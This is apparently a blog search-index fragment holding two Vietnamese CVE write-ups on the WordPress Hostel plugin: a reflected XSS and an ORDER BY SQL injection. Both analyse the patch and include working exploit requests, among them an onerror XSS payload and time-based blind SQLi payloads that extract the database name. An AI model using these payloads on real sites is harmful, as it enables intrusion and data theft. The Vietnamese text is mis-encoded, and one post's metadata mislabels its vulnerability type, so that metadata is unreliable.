$_GET['ob'] l√† d·ªØ li·ªáu nh·∫≠p t·ª´ client (URL query string), attacker c√≥ th·ªÉ ki·ªÉm so√°t ho√†n to√†n. Sink: echo trong HTML attribute ob=\u0026lt;?php echo @$_GET['ob']?\u0026gt; üëâ V√¨ source kh√¥ng ƒëi qua logic c·ªßa controllers n√™n ta kh√¥ng c·∫ßn quan t√¢m diff c·ªßa controllers/bookings.php\nHow it work? ƒê·ªÉ $_GET['ob'] ƒë∆∞·ª£c echo ra HTML attribute c·ªßa th·∫ª \u0026lt;a\u0026gt; th√¨ ƒëi·ªÅu ki·ªán trong kh·ªëi if ch·ª©a th·∫ª \u0026lt;a\u0026gt; ph·∫£i true\n\u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; // ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; // ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt; \u0026lt;?php endif;?\u0026gt;\t{: file=\u0026ldquo;views/bookings.html.php\u0026rdquo; }\nüëâ ƒêi·ªÅu ki·ªán quan tr·ªçng c·∫ßn ch√∫ √Ω l√† if($offset \u0026gt; 0), v√¨ ch·ªâ c·∫ßn ƒëi·ªÅu ki·ªán n√†y ƒë√∫ng th√¨ XSS ƒë√£ c√≥ th·ªÉ x·∫£y ra. Kh√¥ng c·∫ßn quan t√¢m if($count \u0026gt; ($page_limit + $offset)).\nFile views/bookings.html.php kh√¥ng th·ªÉ truy c·∫≠p tr·ª±c ti·∫øp, m√† ph·∫£i ƒë∆∞·ª£c controllers g·ªçi th√¥ng qua h√†m include()\nBi·∫øn $offset ƒë∆∞·ª£c controller kh·ªüi t·∫°o tr∆∞·ªõc r·ªìi truy·ªÅn sang view (views/bookings.html.php) ƒë·ªÉ d√πng trong m·ªánh ƒë·ªÅ if.\nƒê·ªÉ x√°c ƒë·ªãnh controller n√†o g·ªçi file view n√†y, ta t√¨m ki·∫øm bi·∫øn $offset trong th∆∞ m·ª•c controllers c·ªßa plugin.\nK·∫øt qu·∫£ cho th·∫•y $offset ƒë∆∞·ª£c t·∫°o trong nh√°nh default (listing bookings) c·ªßa h√†m tƒ©nh manage() trong class WPHostelBookings, n·∫±m ·ªü file controllers/bookings.php.\nController Code\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { // other logic // list bookings default: // which bookings to show - upcoming or past? $type = empty($_GET[\u0026#39;type\u0026#39;]) ? \u0026#39;upcoming\u0026#39; : sanitize_text_field($_GET[\u0026#39;type\u0026#39;]); $offset = empty($_GET[\u0026#39;offset\u0026#39;]) ? 0 : intval($_GET[\u0026#39;offset\u0026#39;]); $dir = empty($_GET[\u0026#39;dir\u0026#39;]) ? \u0026#39;ASC\u0026#39; : $_GET[\u0026#39;dir\u0026#39;]; if($dir != \u0026#39;ASC\u0026#39; and $dir != \u0026#39;DESC\u0026#39;) $dir = \u0026#39;ASC\u0026#39;; $odir = ($dir == \u0026#39;ASC\u0026#39;) ? \u0026#39;DESC\u0026#39; : \u0026#39;ASC\u0026#39;; // other logic // define limit (as it\u0026#39;s paginated)\t$page_limit = 20; $limit_sql = empty($_GET[\u0026#39;export\u0026#39;]) ? $wpdb-\u0026gt;prepare(\u0026#34;LIMIT %d, %d\u0026#34;, $offset, $page_limit) : \u0026#39;\u0026#39;; // other logic\t$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); $count = $wpdb-\u0026gt;get_var(\u0026#34;SELECT FOUND_ROWS()\u0026#34;);\t// other logic if(@file_exists(get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;)) include get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;; else include(WPHOSTEL_PATH.\u0026#34;/views/bookings.html.php\u0026#34;);\tbreak; } } } {: file=\u0026ldquo;controllers/bookings.php v1.1.5.7\u0026rdquo; }\nPh√¢n t√≠ch bi·∫øn $offset\nBi·∫øn $offset ƒë∆∞·ª£c kh·ªüi t·∫°o t·ª´ tham s·ªë offset trong URL ($_GET['offset']):\nN·∫øu kh√¥ng c√≥ tham s·ªë =\u0026gt; m·∫∑c ƒë·ªãnh 0. N·∫øu c√≥ =\u0026gt; √©p ki·ªÉu s·ªë nguy√™n b·∫±ng intval(). $offset = empty($_GET[\u0026#39;offset\u0026#39;]) ? 0 : intval($_GET[\u0026#39;offset\u0026#39;]); Ph√¢n t√≠ch bi·∫øn $page_limit\n$page_limit ƒë∆∞·ª£c ƒë·∫∑t c·ªë ƒë·ªãnh l√† 20, d√πng k·∫øt h·ª£p v·ªõi $offset ƒë·ªÉ ph√¢n trang:\n// define limit (as it\u0026#39;s paginated)\t$page_limit = 20; // LIMIT offset, 20 $limit_sql = empty($_GET[\u0026#39;export\u0026#39;]) ? $wpdb-\u0026gt;prepare(\u0026#34;LIMIT %d, %d\u0026#34;, $offset, $page_limit) : \u0026#39;\u0026#39;; Khi ƒë√≥ SQL tr·∫£ v·ªÅ t·ªëi ƒëa 20 b·∫£n ghi, b·∫Øt ƒë·∫ßu t·ª´ v·ªã tr√≠ $offset.\n√Åp d·ª•ng v√†o m·ªánh ƒë·ªÅ if:\nTrong view, ƒëo·∫°n code XSS payload ch·ªâ hi·ªÉn th·ªã khi:\nif($offset \u0026gt; 0) =\u0026gt; t·ª©c l√† ph·∫£i c√≥ offset t·ª´ 1 tr·ªü l√™n. Mu·ªën offset \u0026gt; 0 c√≥ √Ω nghƒ©a, c∆° s·ªü d·ªØ li·ªáu ph·∫£i c√≥ √≠t nh·∫•t 2 booking. N·∫øu ch·ªâ c√≥ 1 booking th√¨ sau khi b·ªè qua 1 d√≤ng (offset=1), kh√¥ng c√≤n d·ªØ li·ªáu n√†o ƒë·ªÉ hi·ªÉn th·ªã, n√™n payload c≈©ng kh√¥ng render ra. üëâ Do ƒë√≥, ƒë·ªÉ khai th√°c th√†nh c√¥ng, c·∫ßn c√≥ t·ªëi thi·ªÉu 2 booking trong database.\nCu·ªëi c√πng c√°c k·∫øt qu·∫£ ƒë∆∞·ª£c ch·ª©a trong c√°c bi·∫øn s·∫Ω ƒë∆∞·ª£c hi·ªÉn th·ªã ra views th√¥ng qua h√†m include()\nif(@file_exists(get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;)) include get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;; else include(WPHOSTEL_PATH.\u0026#34;/views/bookings.html.php\u0026#34;);\tWPHOSTEL_PATH c√≥ th·ªÉ l√† h·∫±ng global ƒë∆∞·ª£c s·ª≠ d·ª•ng sau khi file PHP ch·ª©a n√≥ ƒë∆∞·ª£c load, ƒê·ªÉ bi·∫øt ƒë∆∞·ª£c ch√≠nh x√°c, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a WPHOSTEL_PATH.\nüëâ WPHOSTEL_PATH b√¢y gi·ªù l√† ƒë∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi t·ªõi th∆∞ m·ª•c ch·ª©a file hi·ªán t·∫°i.\nExploit Request v·ªõi XSS payload\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;offset=1\u0026amp;ob=\u0026#34;\u0026gt;\u0026lt;img+src%3D1+onerror%3Dalert%28document.domain%29\u0026gt; HTTP/1.1 Payload th·ª±c t·∫ø:\n\u0026#34;\u0026gt;\u0026lt;img src=x onerror=alert(document.domain)\u0026gt; ƒê√≥ng th·∫ª \u0026lt;a\u0026gt; b·∫±ng k√Ω t·ª± \u0026quot;\u0026gt;. Ch√®n th√™m th·∫ª \u0026lt;img\u0026gt; c√≥ thu·ªôc t√≠nh onerror ƒë·ªÉ k√≠ch ho·∫°t JavaScript. D√πng alert(document.domain) thay cho alert(1) nh∆∞ m·ªôt th√≥i quen, nh·∫±m ch·ª©ng minh r√µ r√†ng kh·∫£ nƒÉng ƒë·ªçc th√¥ng tin t·ª´ DOM. ƒêi·ªÅu n√†y c≈©ng gi√∫p tr√°nh tr∆∞·ªùng h·ª£p Sandbox Domain khi·∫øn cho t√°c ƒë·ªông c·ªßa payload b·ªã xem nh·∫π ho·∫∑c kh√¥ng c√≥. K·∫øt qu·∫£:\nConclusion L·ªó h·ªïng CVE-2025-6234 trong plugin WordPress Hostel b·∫Øt ngu·ªìn t·ª´ vi·ªác kh√¥ng x·ª≠ l√Ω ƒë√∫ng d·ªØ li·ªáu ƒë·∫ßu v√†o ($_GET['ob']) tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n giao di·ªán. ƒêi·ªÅu n√†y m·ªü ra kh·∫£ nƒÉng cho attacker ch√®n m√£ ƒë·ªôc Reflected XSS.\nB·∫£n v√° ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch s·ª≠ d·ª•ng h√†m esc_attr() ƒë·ªÉ escape d·ªØ li·ªáu tr∆∞·ªõc khi in ra HTML, ƒë·∫£m b·∫£o r·∫±ng c√°c gi√° tr·ªã kh√¥ng tin c·∫≠y kh√¥ng th·ªÉ ch√®n script ƒë·ªôc h·∫°i.\nKey takeaways:\nLu√¥n sanitize d·ªØ li·ªáu ƒë·∫ßu v√†o v√† escape d·ªØ li·ªáu ƒë·∫ßu ra theo ng·ªØ c·∫£nh (context). V·ªõi WordPress, t·∫≠n d·ª•ng c√°c h√†m built-in nh∆∞ sanitize_text_field(), esc_attr(), esc_html(), wp_kses()\u0026hellip; ƒë·ªÉ gi·∫£m thi·ªÉu r·ªßi ro b·∫£o m·∫≠t. References XSSCross-site scripting (XSS) cheat sheet - PortSwigger\nWordPress Hostel Plugin \u0026lt; 1.1.5.8 is vulnerable to Cross Site Scripting (XSS) - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-08-28-cve-2025-6234/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eHostel\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.1.5.8\u003c/strong\u003e. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l·ª£i d·ª•ng l·ªó h·ªïng n√†y ƒë·ªÉ t·∫•n c√¥ng ng∆∞·ªùi d√πng c√≥ quy·ªÅn cao nh∆∞ \u003cstrong\u003eadmin\u003c/strong\u003e.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-6234\"\u003eCVE-2025-6234\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 1.1.5.8\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: Medium (7.1)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.7(vul) v√† v1.1.5.8(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n g·ªëc r·ªÖ do kh√¥ng th·ª±c hi·ªán \u003cstrong\u003esanitize\u003c/strong\u003e (l√†m s·∫°ch d·ªØ li·ªáu) v√† \u003cstrong\u003eescape\u003c/strong\u003e (m√£ h√≥a d·ªØ li·ªáu ƒë·∫ßu ra) ƒë·ªëi v·ªõi m·ªôt tham s·ªë tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n trang, d·∫´n ƒë·∫øn l·ªó h·ªïng \u003cstrong\u003eReflected Cross-Site Scripting (XSS)\u003c/strong\u003e\u003c/p\u003e","title":"CVE-2025-6234"},{"content":"Introduction CVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Summary: Plugin Hostel, d√πng ƒë·ªÉ qu·∫£n l√Ω ƒë·∫∑t ph√≤ng tr√™n WordPress, ch·ª©a l·ªói SQL Injection t·∫°i tham s·ªë ob trong ph·∫ßn Manage Bookings.\nBackground Hostel Plugin cho ph√©p t·∫°o trang web nh√† tr·ªç, kh√°ch s·∫°n nh·ªè ho·∫∑c BnB b·∫±ng WordPress. N√≥ cung c·∫•p:\nForm ƒë·∫∑t ph√≤ng L·ªãch ph√≤ng Qu·∫£n l√Ω bookings Exploitation Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Code Comparison S·ª≠ d·ª•ng diff tool so s√°nh s·ª± kh√°c bi·ªát gi·ªØa 2 version\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } {: file=\u0026ldquo;controlers/bookings.php v1.1.5.6\u0026rdquo;}\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } {: file=\u0026ldquo;controlers/bookings.php v1.1.5.7\u0026rdquo;}\nüëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'.\nAnalysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi.\nDetect SQLi ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); C·∫•u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch.\nTo√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \u0026quot;manage\u0026quot; trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file models/hostel.php ta c√≥ h√†m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } {: file=\u0026ldquo;models/hostel.php\u0026rdquo; v1.1.5.6 }\n·ªû ƒë√¢y:\nadd_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file hostel.php ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() {: file=\u0026ldquo;hostel.php\u0026rdquo; }\nadd_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. Hook name ·ªü ƒë√¢y l√† admin_menu, nghƒ©a l√† h√†m WPHostel::menu() s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ lo·∫°i b·ªè/escape HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nAutomated Extraction Vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông h√≥a qu√° tr√¨nh t·∫•n c√¥ng: Script\nRemediation C·∫≠p nh·∫≠t l√™n Hostel Plugin v1.1.5.7 ho·∫∑c m·ªõi h∆°n\nTakeaways sanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-08-25-cve-2025-39566/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eSummary\u003c/strong\u003e: Plugin Hostel, d√πng ƒë·ªÉ qu·∫£n l√Ω ƒë·∫∑t ph√≤ng tr√™n WordPress, ch·ª©a l·ªói SQL Injection t·∫°i tham s·ªë \u003ccode\u003eob\u003c/code\u003e trong ph·∫ßn 